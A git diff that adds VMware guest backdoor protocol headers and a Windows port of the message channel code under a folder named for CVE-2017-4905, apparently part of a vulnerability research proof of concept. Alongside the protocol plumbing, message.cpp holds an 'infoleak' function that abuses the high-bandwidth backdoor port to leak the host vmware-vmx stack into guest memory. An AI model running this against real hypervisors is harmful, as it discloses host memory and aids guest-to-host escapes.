+/* EFI Boot Order options, nibble-sized. */
+#define EFI_BOOT_ORDER_TYPE_EFI           0x0
+#define EFI_BOOT_ORDER_TYPE_LEGACY        0x1
+#define EFI_BOOT_ORDER_TYPE_NONE          0xf
+
+#define BDOOR_NETWORK_BOOT_PROTOCOL_NONE  0x0
+#define BDOOR_NETWORK_BOOT_PROTOCOL_IPV4  0x1
+#define BDOOR_NETWORK_BOOT_PROTOCOL_IPV6  0x2
+
+#define BDOOR_SECUREBOOT_STATUS_DISABLED  0xFFFFFFFFUL
+#define BDOOR_SECUREBOOT_STATUS_APPROVED  1
+#define BDOOR_SECUREBOOT_STATUS_DENIED    2
+
+/* High-bandwidth backdoor port. --hpreg */
+
+#define BDOORHB_PORT 0x5659
+#define BDOORHB_CMD_MESSAGE 0
+#define BDOORHB_CMD_VASSERT 1
+#define BDOORHB_CMD_MAX 2
+
+/*
+ * There is another backdoor which allows access to certain TSC-related
+ * values using otherwise illegal PMC indices when the pseudo_perfctr
+ * control flag is set.
+ */
+
+#define BDOOR_PMC_HW_TSC      0x10000
+#define BDOOR_PMC_REAL_NS     0x10001
+#define BDOOR_PMC_APPARENT_NS 0x10002
+#define BDOOR_PMC_PSEUDO_TSC  0x10003
+
+#define IS_BDOOR_PMC(index)  (((index) | 3) == 0x10003)
+#define BDOOR_CMD(ecx)       ((ecx) & 0xffff)
+
+/* Sub commands for BDOOR_CMD_VMK_INFO */
+#define BDOOR_CMD_VMK_INFO_ENTRY   1
+
+#ifdef VMM
+/*
+ *----------------------------------------------------------------------
+ *
+ * Backdoor_CmdRequiresFullyValidVCPU --
+ *
+ *    A few backdoor commands require the full VCPU to be valid
+ *    (including GDTR, IDTR, TR and LDTR). The rest get read/write
+ *    access to GPRs and read access to Segment registers (selectors).
+ *
+ * Result:
+ *    True iff VECX contains a command that require the full VCPU to
+ *    be valid.
+ *
+ *----------------------------------------------------------------------
+ */
+static INLINE Bool
+Backdoor_CmdRequiresFullyValidVCPU(unsigned cmd)
+{
+   return cmd == BDOOR_CMD_SIDT ||
+          cmd == BDOOR_CMD_SGDT ||
+          cmd == BDOOR_CMD_SLDT_STR;
+}
+#endif
+
+#ifdef VM_ARM_64
+
+#define BDOOR_ARM64_LB_PORT      (BDOOR_PORT)
+#define BDOOR_ARM64_HB_PORT_IN   (BDOORHB_PORT)
+#define BDOOR_ARM64_HB_PORT_OUT  (BDOORHB_PORT +1)
+
+#define BDOOR_ARG0 REG_X0
+#define BDOOR_ARG1 REG_X1
+#define BDOOR_ARG2 REG_X2
+#define BDOOR_ARG3 REG_X3
+#define BDOOR_ARG4 REG_X4
+#define BDOOR_ARG5 REG_X5
+#define BDOOR_ARG6 REG_X6
+
+#else
+
+#define BDOOR_ARG0 REG_RAX
+#define BDOOR_ARG1 REG_RBX
+#define BDOOR_ARG2 REG_RCX
+#define BDOOR_ARG3 REG_RDX
+#define BDOOR_ARG4 REG_RSI
+#define BDOOR_ARG5 REG_RDI
+#define BDOOR_ARG6 REG_RBP
+
+#endif
+
+
+#endif
diff --git a/CVE-2017-4905_and_uaf/vmware/backdoor_types.h b/CVE-2017-4905_and_uaf/vmware/backdoor_types.h
new file mode 100644
index 0000000..f2c70e0
--- /dev/null
+++ b/CVE-2017-4905_and_uaf/vmware/backdoor_types.h
@@ -0,0 +1,128 @@
+/*********************************************************
+ * Copyright (C) 1999-2016 VMware, Inc. All rights reserved.
+ *
+ * This program is free software; you can redistribute it and/or modify it
+ * under the terms of the GNU Lesser General Public License as published
+ * by the Free Software Foundation version 2.1 and no later version.
+ *
+ * This program is distributed in the hope that it will be useful, but
+ * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
+ * or FITNESS FOR A PARTICULAR PURPOSE.  See the Lesser GNU General Public
+ * License for more details.
+ *
+ * You should have received a copy of the GNU Lesser General Public License
+ * along with this program; if not, write to the Free Software Foundation, Inc.,
+ * 51 Franklin St, Fifth Floor, Boston, MA  02110-1301 USA.
+ *
+ *********************************************************/
+
+/*********************************************************
+ * The contents of this file are subject to the terms of the Common
+ * Development and Distribution License (the "License") version 1.0
+ * and no later version.  You may not use this file except in
+ * compliance with the License.
+ *
+ * You can obtain a copy of the License at
+ *         http://www.opensource.org/licenses/cddl1.php
+ *
+ * See the License for the specific language governing permissions
+ * and limitations under the License.
+ *
+ *********************************************************/
+
+/*
+ * backdoor_types.h --
+ *
+ *    Type definitions for backdoor interaction code.
+ */
+
+#ifndef _BACKDOOR_TYPES_H_
+#define _BACKDOOR_TYPES_H_
+
+#ifndef VM_I386
+#error The backdoor protocol is only supported on x86 architectures.
+#endif
+
+/*
+ * These #defines are intended for defining register structs as part of
+ * existing named unions. If the union should encapsulate the register
+ * (and nothing else), use DECLARE_REG_NAMED_STRUCT defined below.
+ */
+
+#define DECLARE_REG32_STRUCT \
+   struct { \
+      uint16 low; \
+      uint16 high; \
+   } halfs; \
+   uint32 word
+
+#define DECLARE_REG64_STRUCT \
+   DECLARE_REG32_STRUCT; \
+   struct { \
+      uint32 low; \
+      uint32 high; \
+   } words; \
+   uint64 quad
+
+#if defined (VM_X86_64)  ||  defined (VM_ARM_64)
+#define DECLARE_REG_STRUCT DECLARE_REG64_STRUCT
+#else
+#define DECLARE_REG_STRUCT DECLARE_REG32_STRUCT
+#endif
+
+#define DECLARE_REG_NAMED_STRUCT(_r) \
+   union { DECLARE_REG_STRUCT; } _r
+
+/*
+ * Some of the registers are expressed by semantic name, because if they were
+ * expressed as register structs declared above, we could only address them
+ * by fixed size (half-word, word, quad, etc.) instead of by varying size
+ * (size_t, uintptr_t).
+ *
+ * To be cleaner, these registers are expressed ONLY by semantic name,
+ * rather than by a union of the semantic name and a register struct.
+ */
+typedef union {
+   struct {
+      DECLARE_REG_NAMED_STRUCT(ax);
+      size_t size; /* Register bx. */
+      DECLARE_REG_NAMED_STRUCT(cx);
+      DECLARE_REG_NAMED_STRUCT(dx);
+      DECLARE_REG_NAMED_STRUCT(si);
+      DECLARE_REG_NAMED_STRUCT(di);
+   } in;
+   struct {
+      DECLARE_REG_NAMED_STRUCT(ax);
+      DECLARE_REG_NAMED_STRUCT(bx);
+      DECLARE_REG_NAMED_STRUCT(cx);
+      DECLARE_REG_NAMED_STRUCT(dx);
+      DECLARE_REG_NAMED_STRUCT(si);
+      DECLARE_REG_NAMED_STRUCT(di);
+   } out;
+} Backdoor_proto;
+
+typedef union {
+   struct {
+      DECLARE_REG_NAMED_STRUCT(ax);
+      DECLARE_REG_NAMED_STRUCT(bx);
+      size_t size; /* Register cx. */
+      DECLARE_REG_NAMED_STRUCT(dx);
+      uintptr_t srcAddr; /* Register si. */
+      uintptr_t dstAddr; /* Register di. */
+      DECLARE_REG_NAMED_STRUCT(bp);
+   } in;
+   struct {
+      DECLARE_REG_NAMED_STRUCT(ax);
+      DECLARE_REG_NAMED_STRUCT(bx);
+      DECLARE_REG_NAMED_STRUCT(cx);
+      DECLARE_REG_NAMED_STRUCT(dx);
+      DECLARE_REG_NAMED_STRUCT(si);
+      DECLARE_REG_NAMED_STRUCT(di);
+      DECLARE_REG_NAMED_STRUCT(bp);
+   } out;
+} Backdoor_proto_hb;
+
+
+#undef DECLARE_REG_STRUCT
+
+#endif /* _BACKDOOR_TYPES_H_ */
diff --git a/CVE-2017-4905_and_uaf/vmware/guest_msg_def.h b/CVE-2017-4905_and_uaf/vmware/guest_msg_def.h
new file mode 100644
index 0000000..8b3a51d
--- /dev/null
+++ b/CVE-2017-4905_and_uaf/vmware/guest_msg_def.h
@@ -0,0 +1,106 @@
+/*********************************************************
+ * Copyright (C) 1998-2016 VMware, Inc. All rights reserved.
+ *
+ * This program is free software; you can redistribute it and/or modify it
+ * under the terms of the GNU Lesser General Public License as published
+ * by the Free Software Foundation version 2.1 and no later version.
+ *
+ * This program is distributed in the hope that it will be useful, but
+ * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
+ * or FITNESS FOR A PARTICULAR PURPOSE.  See the Lesser GNU General Public
+ * License for more details.
+ *
+ * You should have received a copy of the GNU Lesser General Public License
+ * along with this program; if not, write to the Free Software Foundation, Inc.,
+ * 51 Franklin St, Fifth Floor, Boston, MA  02110-1301 USA.
+ *
+ *********************************************************/
+
+/*********************************************************
+ * The contents of this file are subject to the terms of the Common
+ * Development and Distribution License (the "License") version 1.0
+ * and no later version.  You may not use this file except in
+ * compliance with the License.
+ *
+ * You can obtain a copy of the License at
+ *         http://www.opensource.org/licenses/cddl1.php
+ *
+ * See the License for the specific language governing permissions
+ * and limitations under the License.
+ *
+ *********************************************************/
+
+/*
+ * guest_msg_def.h --
+ *
+ *    Second layer of the internal communication channel between guest
+ *    applications and vmware
+ *
+ */
+
+#ifndef _GUEST_MSG_DEF_H_
+#define _GUEST_MSG_DEF_H_
+
+#define INCLUDE_ALLOW_MODULE
+#define INCLUDE_ALLOW_USERLEVEL
+
+//#include "includeCheck.h"
+
+
+/* Basic request types */
+typedef enum {
+   MESSAGE_TYPE_OPEN,
+   MESSAGE_TYPE_SENDSIZE,
+   MESSAGE_TYPE_SENDPAYLOAD,
+   MESSAGE_TYPE_RECVSIZE,
+   MESSAGE_TYPE_RECVPAYLOAD,
+   MESSAGE_TYPE_RECVSTATUS,
+   MESSAGE_TYPE_CLOSE,
+} MessageType;
+
+
+/* Reply statuses */
+/*  The basic request succeeded */
+#define MESSAGE_STATUS_SUCCESS  0x0001
+/*  vmware has a message available for its party */
+#define MESSAGE_STATUS_DORECV   0x0002
+/*  The channel has been closed */
+#define MESSAGE_STATUS_CLOSED   0x0004
+/*  vmware removed the message before the party fetched it */
+#define MESSAGE_STATUS_UNSENT   0x0008
+/*  A checkpoint occurred */
+#define MESSAGE_STATUS_CPT      0x0010
+/*  An underlying device is powering off */
+#define MESSAGE_STATUS_POWEROFF 0x0020
+/*  vmware has detected a timeout on the channel */
+#define MESSAGE_STATUS_TIMEOUT  0x0040
+/*  vmware supports high-bandwidth for sending and receiving the payload */
+#define MESSAGE_STATUS_HB       0x0080
+
+/*
+ * This mask defines the status bits that the guest is allowed to set;
+ * we use this to mask out all other bits when receiving the status
+ * from the guest. Otherwise, the guest can manipulate VMX state by
+ * setting status bits that are only supposed to be changed by the
+ * VMX. See bug 45385.
+ */
+#define MESSAGE_STATUS_GUEST_MASK    MESSAGE_STATUS_SUCCESS
+
+/*
+ * Max number of channels.
+ * Unfortunately this has to be public because the monitor part
+ * of the backdoor needs it for its trivial-case optimization. [greg]
+ */
+#define GUESTMSG_MAX_CHANNEL 8
+
+/* Flags to open a channel. --hpreg */
+#define GUESTMSG_FLAG_COOKIE 0x80000000
+#define GUESTMSG_FLAG_ALL GUESTMSG_FLAG_COOKIE
+
+/*
+ * Maximum size of incoming message. This is to prevent denial of host service
+ * attacks from guest applications.
+ */
+#define GUESTMSG_MAX_IN_SIZE (64 * 1024)
+
+#endif /* _GUEST_MSG_DEF_H_ */
diff --git a/CVE-2017-4905_and_uaf/vmware/message.cpp b/CVE-2017-4905_and_uaf/vmware/message.cpp
new file mode 100644
index 0000000..f3e0c5c
--- /dev/null
+++ b/CVE-2017-4905_and_uaf/vmware/message.cpp
@@ -0,0 +1,910 @@
+/*********************************************************
+* Copyright (C) 1999-2016 VMware, Inc. All rights reserved.
+*
+* This program is free software; you can redistribute it and/or modify it
+* under the terms of the GNU Lesser General Public License as published
+* by the Free Software Foundation version 2.1 and no later version.
+*
+* This program is distributed in the hope that it will be useful, but
+* WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
+* or FITNESS FOR A PARTICULAR PURPOSE.  See the Lesser GNU General Public
+* License for more details.
+*
+* You should have received a copy of the GNU Lesser General Public License
+* along with this program; if not, write to the Free Software Foundation, Inc.,
+* 51 Franklin St, Fifth Floor, Boston, MA  02110-1301 USA.
+*
+*********************************************************/
+
+/*********************************************************
+* The contents of this file are subject to the terms of the Common
+* Development and Distribution License (the "License") version 1.0
+* and no later version.  You may not use this file except in
+* compliance with the License.
+*
+* You can obtain a copy of the License at
+*         http://www.opensource.org/licenses/cddl1.php
+*
+* See the License for the specific language governing permissions
+* and limitations under the License.
+*
+*********************************************************/
+
+/*
+* message.c --
+*
+*    Second layer of the internal communication channel between guest
+*    applications and vmware
+*
+*    Build a generic messaging system between guest applications and vmware.
+*
+*    The protocol is not completely symmetrical, because:
+*     . basic requests can only be sent by guest applications (when vmware
+*       wants to post a message to a guest application, the message will be
+*       really fetched only when the guest application will poll for new
+*       available messages)
+*     . several guest applications can talk to vmware, while the contrary is
+*       not true
+*
+*    Operations that are not atomic (in terms of number of backdoor calls)
+*    can be aborted by vmware if a checkpoint/restore occurs in the middle of
+*    such an operation. This layer takes care of retrying those operations.
+*/
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+#if defined(__KERNEL__) || defined(_KERNEL) || defined(KERNEL)
+#   include "kernelStubs.h"
+#else
+#   include <stdio.h>
+#   include <stdlib.h>
+#endif
+
+#include <windows.h>
+#include "backdoor_def.h"
+#include "guest_msg_def.h"
+#include "backdoor.h"
+#include "message.h"
+
+#define _CONCRT_ASSERT(x) __assume(x)
+#define ASSERT(x) do {_CONCRT_ASSERT(x); __assume(x);} while(false)
+#if defined(MESSAGE_DEBUG)
+#  define MESSAGE_LOG(...)   Warning(__VA_ARGS__)
+#else
+#  define MESSAGE_LOG(...)
+#endif
+	/*
+	*-----------------------------------------------------------------------------
+	*
+	* Message_OpenAllocated --
+	*
+	*    Open a communication channel using an allocated, but unitialized
+	*    Message_Channel structure.  A receive buffer may be optionally
+	*    specified with a given size.  If a message larger than this
+	*    buffer is received the communication will be aborted.  If no
+	*    receiver buffer is specified, one will be dynamically allocated
+	*    to size.  When finished with the channel, Message_CloseAllocated
+	*    should be called.
+	*
+	* Result:
+	*    TRUE on success, FALSE on failure.
+	*
+	* Side-effects:
+	*    See above.
+	*
+	*-----------------------------------------------------------------------------
+	*/
+
+	void /*__declspec(naked)*/ BackdoorHbIn(Backdoor_proto_hb *myBp) // IN/OUT
+	{
+		__asm{
+			mov eax, myBp;
+			push ebp;
+			push eax;
+			mov ebp, [eax + 24];
+			mov edi, [eax + 20];
+			mov esi, [eax + 16];
+			mov edx, [eax + 12];
+			mov ecx, [eax + 8];
+			mov ebx, [eax + 4];
+			mov eax, [eax];
+			cld;
+			rep insb;
+			xchg[esp], eax;
+			mov[eax + 24], ebp;
+			mov[eax + 20], edi;
+			mov[eax + 16], esi;
+			mov[eax + 12], edx;
+			mov[eax + 8], ecx;
+			mov[eax + 4], ebx;
+			pop dword ptr [eax];
+			pop ebp;
+		};
+	}
+
+
+	void /*__declspec(naked)*/ BackdoorHbOut(Backdoor_proto_hb *myBp) // IN/OUT
+	{
+
+		__asm{
+
+			mov eax, myBp;
+			push ebp;
+			push eax;
+			mov ebp, [eax + 24];
+			mov edi, [eax + 20];
+			mov esi, [eax + 16];
+			mov edx, [eax + 12];
+			mov ecx, [eax + 8];
+			mov ebx, [eax + 4];
+			mov eax, [eax];
+			cld;
+			rep outsb;
+			xchg[esp], eax;
+			mov[eax + 24], ebp;
+			mov[eax + 20], edi;
+			mov[eax + 16], esi;
+			mov[eax + 12], edx;
+			mov[eax + 8], ecx;
+			mov[eax + 4], ebx;
+			pop dword ptr [eax];
+			pop ebp;
+		};
+	}
+
+	void
+		Backdoor_HbIn(Backdoor_proto_hb *myBp) // IN/OUT
+	{
+			ASSERT(myBp);
+
+			myBp->in.ax.word = BDOOR_MAGIC;
+			myBp->in.dx.halfs.low = BDOORHB_PORT;
+
+
+#ifdef USE_VALGRIND
+			VALGRIND_NON_SIMD_CALL1(BackdoorHbInValgrind, myBp);
+#else
+			BackdoorHbIn(myBp);
+#endif
+
+		}
+
+	void
+		Backdoor_HbOut(Backdoor_proto_hb *myBp) // IN/OUT
+	{
+			ASSERT(myBp);
+
+			myBp->in.ax.word = BDOOR_MAGIC;
+			myBp->in.dx.halfs.low = BDOORHB_PORT;
+
+#ifdef USE_VALGRIND
+			VALGRIND_NON_SIMD_CALL1(BackdoorHbOutValgrind, myBp);
+#else
+			BackdoorHbOut(myBp);
+#endif
+		}
+
+	void Backdoor_InOut(Backdoor_proto *myBp) // IN/OUT
+	{
+		_asm {
+			mov eax, myBp;
+			push eax;
+			mov edi, [eax + 20];
+			mov esi, [eax + 16];
+			mov edx, [eax + 12];
+			mov ecx, [eax + 8];
+			mov ebx, [eax + 4];
+			mov eax, [eax];
+			in eax, dx;
+			xchg[esp], eax;
+			mov[eax + 20], edi;
+			mov[eax + 16], esi;
+			mov[eax + 12], edx;
+			mov[eax + 8], ecx;
+			mov[eax + 4], ebx;
+			pop dword ptr [eax];
+		};
+	}
+
+	void Backdoor(Backdoor_proto *myBp) // IN/OUT
+	{
+
+		myBp->in.ax.word = BDOOR_MAGIC;
+		myBp->in.dx.halfs.low = BDOOR_PORT;
+
+		Backdoor_InOut(myBp);
+	}
+	Bool
+		Message_OpenAllocated(uint32 proto, Message_Channel *chan,
+		char *receiveBuffer, size_t receiveBufferSize)
+	{
+			uint32 flags;
+			Backdoor_proto bp;
+
+			flags = GUESTMSG_FLAG_COOKIE;
+		retry:
+			/* IN: Type */
+			bp.in.cx.halfs.high = MESSAGE_TYPE_OPEN;
+			/* IN: Magic number of the protocol and flags */
+			bp.in.size = proto | flags;
+
+			bp.in.cx.halfs.low = BDOOR_CMD_MESSAGE;
+			Backdoor(&bp);
+
+			/* OUT: Status */
+			if ((bp.in.cx.halfs.high & MESSAGE_STATUS_SUCCESS) == 0) {
+				if (flags) {
+					/* Cookies not supported. Fall back to no cookie. --hpreg */
+					flags = 0;
+					goto retry;
+				}
+
+				MESSAGE_LOG("Message: Unable to open a communication channel\n");
+				return FALSE;
+			}
+
+			/* OUT: Id and cookie */
+			chan->id = bp.in.dx.halfs.high;
+			chan->cookieHigh = bp.out.si.word;
+			chan->cookieLow = bp.out.di.word;
+
+			/* Initialize the channel */
+			chan->in = (unsigned char *)receiveBuffer;
+			chan->inAlloc = receiveBufferSize;
+
+			ASSERT((receiveBuffer == NULL) == (receiveBufferSize == 0));
+			chan->inPreallocated = receiveBuffer != NULL;
+
+			return TRUE;
+		}
+
+	void* infoleak()
+	{
+		char *buf = (char *)VirtualAlloc(0, 0x8000, MEM_COMMIT, PAGE_READWRITE);
+		memset(buf, 0, 0x8000);
+		Backdoor_proto_hb hb;
+		memset(&hb, 0, sizeof(Backdoor_proto_hb));
+		hb.in.size = 0x8000;
+		hb.in.dstAddr = (uintptr_t)buf;
+		hb.in.bx.halfs.low = 2;
+		Backdoor_HbIn(&hb);
+		// buf will be filled with contents leaked from vmware-vmx stack
+		// 
+		return buf;
+	}
+
+	/*
+	*-----------------------------------------------------------------------------
+	*
+	* Message_Open --
+	*
+	*    Open a communication channel
+	*
+	* Result:
+	*    An allocated Message_Channel on success
+	*    NULL on failure
+	*
+	* Side-effects:
+	*    None
+	*
+	*-----------------------------------------------------------------------------
+	*/
+
+	Message_Channel *
+		Message_Open(uint32 proto) // IN
+	{
+			Message_Channel *chan = (Message_Channel*)malloc(sizeof *chan);
+
+			if (chan != NULL && !Message_OpenAllocated(proto, chan, NULL, 0)) {
+				free(chan);
+				chan = NULL;
+			}
+			return chan;
+		}
+
+	Bool Message_SendSize(Message_Channel * chan, unsigned int size)
+	{
+		Backdoor_proto bp;
+		/*
+		* Send the size.
+		*/
+
+		/* IN: Type */
+		bp.in.cx.halfs.high = MESSAGE_TYPE_SENDSIZE;
+		/* IN: Id and cookie */
+		bp.in.dx.halfs.high = chan->id;
+		bp.in.si.word = chan->cookieHigh;
+		bp.in.di.word = chan->cookieLow;
+		/* IN: Size */
+		bp.in.size = size;
+
+		bp.in.cx.halfs.low = BDOOR_CMD_MESSAGE;
+		Backdoor(&bp);
+
+		/* OUT: Status */
+		if ((bp.in.cx.halfs.high & MESSAGE_STATUS_SUCCESS) == 0) {
+			MESSAGE_LOG("Message: Unable to send a message over the communication "
+				"channel %u\n", chan->id);
+			return FALSE;
+		}
+		else
+		{
+			return TRUE;
+		}
+	}
+
+	Bool Message_SendHigh(Message_Channel *chan,    // IN/OUT
+		const unsigned char *buf, // IN
+		size_t bufSize)
+	{
+		if (bufSize) {
+			Backdoor_proto_hb bphb;
+
+			bphb.in.bx.halfs.low = BDOORHB_CMD_MESSAGE;
+			bphb.in.bx.halfs.high = MESSAGE_STATUS_SUCCESS;
+			bphb.in.dx.halfs.high = chan->id;
+			bphb.in.bp.word = chan->cookieHigh;
+			bphb.in.dstAddr = chan->cookieLow;
+			bphb.in.size = bufSize;
+			bphb.in.srcAddr = (uintptr_t)buf;
+			Backdoor_HbOut(&bphb);
+			if ((bphb.in.bx.halfs.high & MESSAGE_STATUS_SUCCESS) == 0) {
+				if ((bphb.in.bx.halfs.high & MESSAGE_STATUS_CPT) != 0) {
+					/* A checkpoint occurred. Retry the operation. --hpreg */
+					return FALSE;
+				}
+
+				MESSAGE_LOG("Message: Unable to send a message over the "
+					"communication channel %u\n", chan->id);
+				return FALSE;
+			}
+			else
+			{
+				return TRUE;
+			}
+		}
+	}
+
+	Bool Message_SendLow(Message_Channel *chan,    // IN/OUT
+		const unsigned char *buf, // IN
+		size_t bufSize)
+	{
+		const unsigned char *myBuf=buf;
+		Backdoor_proto bp;
+		size_t myBufSize = bufSize;
+		for (;;) {
+			if (myBufSize == 0) {
+				/* We are done */
+				break;
+			}
+
+			/* IN: Type */
+			bp.in.cx.halfs.high = MESSAGE_TYPE_SENDPAYLOAD;
+			/* IN: Id and cookie */
+			bp.in.dx.halfs.high = chan->id;
+			bp.in.si.word = chan->cookieHigh;
+			bp.in.di.word = chan->cookieLow;
+			/* IN: Piece of message */
+			/*
+			* Beware in case we are not allowed to read extra bytes beyond the
+			* end of the buffer.
+			*/
+			switch (myBufSize) {
+			case 1:
+				bp.in.size = myBuf[0];
+				myBufSize -= 1;
+				break;
+			case 2:
+				bp.in.size = myBuf[0] | myBuf[1] << 8;
+				myBufSize -= 2;
+				break;
+			case 3:
+				bp.in.size = myBuf[0] | myBuf[1] << 8 | myBuf[2] << 16;
+				myBufSize -= 3;
+				break;
+			default:
+				bp.in.size = *(const uint32 *)myBuf;
+				myBufSize -= 4;
+				break;
+			}
+
+			bp.in.cx.halfs.low = BDOOR_CMD_MESSAGE;
+			Backdoor(&bp);
+
+			/* OUT: Status */
+			if ((bp.in.cx.halfs.high & MESSAGE_STATUS_SUCCESS) == 0) {
+				if ((bp.in.cx.halfs.high & MESSAGE_STATUS_CPT) != 0) {
+					/* A checkpoint occurred. Retry the operation. --hpreg */
+					return FALSE;
+				}
+
+				MESSAGE_LOG("Message: Unable to send a message over the "
+					"communication channel %u\n", chan->id);
+				return FALSE;
+			}
+
+			myBuf += 4;
+		}
+	}
+	/*
+	*-----------------------------------------------------------------------------
+	*
+	* Message_Send --
+	*
+	*    Send a message over a communication channel
+	*
+	* Result:
+	*    TRUE on success
+	*    FALSE on failure (the message is discarded by vmware)
+	*
+	* Side-effects:
+	*    None
+	*
+	*-----------------------------------------------------------------------------
+	*/
+
+	Bool
+		Message_Send(Message_Channel *chan,    // IN/OUT
+		const unsigned char *buf, // IN
+		size_t bufSize)           // IN
+	{
+			const unsigned char *myBuf;
+			size_t myBufSize;
+			Backdoor_proto bp;
+
+		retry:
+			myBuf = buf;
+			myBufSize = bufSize;
+
+			/*
+			* Send the size.
+			*/
+
+			/* IN: Type */
+			bp.in.cx.halfs.high = MESSAGE_TYPE_SENDSIZE;
+			/* IN: Id and cookie */
+			bp.in.dx.halfs.high = chan->id;
+			bp.in.si.word = chan->cookieHigh;
+			bp.in.di.word = chan->cookieLow;
+			/* IN: Size */
+			bp.in.size = myBufSize;
+
+			bp.in.cx.halfs.low = BDOOR_CMD_MESSAGE;
+			Backdoor(&bp);
+
+			/* OUT: Status */
+			if ((bp.in.cx.halfs.high & MESSAGE_STATUS_SUCCESS) == 0) {
+				MESSAGE_LOG("Message: Unable to send a message over the communication "
+					"channel %u\n", chan->id);
+				return FALSE;
+			}
+
+			if (bp.in.cx.halfs.high & MESSAGE_STATUS_HB) {
+				/*
+				* High-bandwidth backdoor port supported. Send the message in one
+				* backdoor operation. --hpreg
+				*/
+
+				if (myBufSize) {
+					Backdoor_proto_hb bphb;
+
+					bphb.in.bx.halfs.low = BDOORHB_CMD_MESSAGE;
+					bphb.in.bx.halfs.high = MESSAGE_STATUS_SUCCESS;
+					bphb.in.dx.halfs.high = chan->id;
+					bphb.in.bp.word = chan->cookieHigh;
+					bphb.in.dstAddr = chan->cookieLow;
+					bphb.in.size = myBufSize;
+					bphb.in.srcAddr = (uintptr_t)myBuf;
+					Backdoor_HbOut(&bphb);
+					if ((bphb.in.bx.halfs.high & MESSAGE_STATUS_SUCCESS) == 0) {
+						if ((bphb.in.bx.halfs.high & MESSAGE_STATUS_CPT) != 0) {
+							/* A checkpoint occurred. Retry the operation. --hpreg */
+							goto retry;
+						}
+
+						MESSAGE_LOG("Message: Unable to send a message over the "
+							"communication channel %u\n", chan->id);
+						return FALSE;
+					}
+				}
+			}
+			else {
+				/*
+				* High-bandwidth backdoor port not supported. Send the message, 4 bytes
+				* at a time. --hpreg
+				*/
+
+				for (;;) {
+					if (myBufSize == 0) {
+						/* We are done */
+						break;
+					}
+
+					/* IN: Type */
+					bp.in.cx.halfs.high = MESSAGE_TYPE_SENDPAYLOAD;
+					/* IN: Id and cookie */
+					bp.in.dx.halfs.high = chan->id;
+					bp.in.si.word = chan->cookieHigh;
+					bp.in.di.word = chan->cookieLow;
+					/* IN: Piece of message */
+					/*
+					* Beware in case we are not allowed to read extra bytes beyond the
+					* end of the buffer.
+					*/
+					switch (myBufSize) {
+					case 1:
+						bp.in.size = myBuf[0];
+						myBufSize -= 1;
+						break;
+					case 2:
+						bp.in.size = myBuf[0] | myBuf[1] << 8;
+						myBufSize -= 2;
+						break;
+					case 3:
+						bp.in.size = myBuf[0] | myBuf[1] << 8 | myBuf[2] << 16;
+						myBufSize -= 3;
+						break;
+					default:
+						bp.in.size = *(const uint32 *)myBuf;
+						myBufSize -= 4;
+						break;
+					}
+
+					bp.in.cx.halfs.low = BDOOR_CMD_MESSAGE;
+					Backdoor(&bp);
+
+					/* OUT: Status */
+					if ((bp.in.cx.halfs.high & MESSAGE_STATUS_SUCCESS) == 0) {
+						if ((bp.in.cx.halfs.high & MESSAGE_STATUS_CPT) != 0) {
+							/* A checkpoint occurred. Retry the operation. --hpreg */
+							goto retry;
+						}
+
+						MESSAGE_LOG("Message: Unable to send a message over the "
+							"communication channel %u\n", chan->id);
+						return FALSE;
+					}
+
+					myBuf += 4;
+				}
+			}
+
+			return TRUE;
+		}
+
+
+	/*
+	*-----------------------------------------------------------------------------
+	*
+	* Message_Receive --
+	*
+	*    If vmware has posted a message for this channel, retrieve it
+	*
+	* Result:
+	*    TRUE on success (bufSize is 0 if there is no message)
+	*    FALSE on failure
+	*
+	* Side-effects:
+	*    None
+	*
+	*-----------------------------------------------------------------------------
+	*/
+
+	Bool
+		Message_Receive(Message_Channel *chan, // IN/OUT
+		unsigned char **buf,   // OUT
+		size_t *bufSize)       // OUT
+	{
+			Backdoor_proto bp;
+			size_t myBufSize;
+			unsigned char *myBuf;
+
+		retry:
+			/*
+			* Is there a message waiting for our retrieval?
+			*/
+
+			/* IN: Type */
+			bp.in.cx.halfs.high = MESSAGE_TYPE_RECVSIZE;
+			/* IN: Id and cookie */
+			bp.in.dx.halfs.high = chan->id;
+			bp.in.si.word = chan->cookieHigh;
+			bp.in.di.word = chan->cookieLow;
+
+			bp.in.cx.halfs.low = BDOOR_CMD_MESSAGE;
+			Backdoor(&bp);
+
+			/* OUT: Status */
+			if ((bp.in.cx.halfs.high & MESSAGE_STATUS_SUCCESS) == 0) {
+				MESSAGE_LOG("Message: Unable to poll for messages over the "
+					"communication channel %u\n", chan->id);
+				return FALSE;
+			}
+
+			if ((bp.in.cx.halfs.high & MESSAGE_STATUS_DORECV) == 0) {
+				/* No message to retrieve */
+				*bufSize = 0;
+				return TRUE;
+			}
+
+			/*
+			* Receive the size.
+			*/
+
+			/* OUT: Type */
+			if (bp.in.dx.halfs.high != MESSAGE_TYPE_SENDSIZE) {
+				MESSAGE_LOG("Message: Protocol error. Expected a "
+					"MESSAGE_TYPE_SENDSIZE request from vmware\n");
+				return FALSE;
+			}
+
+			/* OUT: Size */
+			myBufSize = bp.out.bx.word;
+
+			/*
+			* Allocate an extra byte for a trailing NUL character. The code that will
+			* deal with this message may not know about binary strings, and may expect
+			* a C string instead. --hpreg
+			*/
+			if (myBufSize + 1 > chan->inAlloc) {
+				if (chan->inPreallocated) {
+					MESSAGE_LOG("Message: Buffer too small to receive a message over "
+						"the communication channel %u\n", chan->id);
+					goto error_quit;
+				}
+				else {
+					myBuf = (unsigned char *)realloc(chan->in, myBufSize + 1);
+					if (myBuf == NULL) {
+						MESSAGE_LOG("Message: Not enough memory to receive a message over "
+							"the communication channel %u\n", chan->id);
+						goto error_quit;
+					}
+					chan->in = myBuf;
+					chan->inAlloc = myBufSize + 1;
+				}
+			}
+			*bufSize = myBufSize;
+			myBuf = *buf = chan->in;
+
+			if (bp.in.cx.halfs.high & MESSAGE_STATUS_HB) {
+				/*
+				* High-bandwidth backdoor port supported. Receive the message in one
+				* backdoor operation. --hpreg
+				*/
+
+				if (myBufSize) {
+					Backdoor_proto_hb bphb;
+
+					bphb.in.bx.halfs.low = BDOORHB_CMD_MESSAGE;
+					bphb.in.bx.halfs.high = MESSAGE_STATUS_SUCCESS;
+					bphb.in.dx.halfs.high = chan->id;
+					bphb.in.srcAddr = chan->cookieHigh;
+					bphb.in.bp.word = chan->cookieLow;
+					bphb.in.size = myBufSize;
+					bphb.in.dstAddr = (uintptr_t)myBuf;
